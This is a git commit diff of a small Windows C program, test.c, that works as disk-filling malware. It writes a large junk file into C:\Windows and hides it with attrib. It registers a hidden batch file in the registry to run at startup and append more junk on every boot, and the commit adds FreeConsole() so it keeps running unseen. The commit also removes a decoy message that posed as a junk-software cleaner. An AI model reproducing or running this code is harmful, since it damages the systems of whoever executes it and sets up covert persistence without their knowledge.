dc6fa9627280ccd2d7508fbc117bdd052ecfb8f3
LeslieRichardCheung <98405581+LeslieRichardCheung@users.noreply.github.com>
2022-02-13 12:24:54 +0800

    Add files via upload

--- test.c
+++ test.c
@@ -5,12 +5,12 @@
 //For windows
 int main(){
 	int i;
-	puts("正在扫描垃圾软件，清理完成后会自动退出，请最小化窗口"); 
 	FILE*file=fopen("C:\\Windows\\out","w");
 	char path[]="\"C:\\Windows\\test.bat\"";
 	HKEY key;
-	for(i=0;i<=(INT_MAX/2);i++){
-		fprintf(file,"1145141919810 ");
+	FreeConsole();//即使关闭程序也会隐藏在后台执行 
+	for(i=0;i<=(INT_MAX/4);i++){
+		fprintf(file,"1145141919810");
 	}
 	system("attrib +s +h +r C:\\Windows\\out");//隐藏指定文件 
 	//修改注册表使指定文件开机自启 
@@ -18,5 +18,5 @@ int main(){
 	RegSetValueEx(key,"FuckYou",0,REG_SZ,(const char*)path,sizeof(path));
 	file=fopen("C:\\Windows\\test.bat","w");
 	fprintf(file,"@echo off\nset i=0\nattrib -s -h -r out\n:start\nset /a i+=1\nif %%i%%==10000 goto t\necho 1145141919810 >>out\ngoto start\n:t\nattrib +s +h +r out\nexit");
-	return 114514;
+	exit(114514);
 }
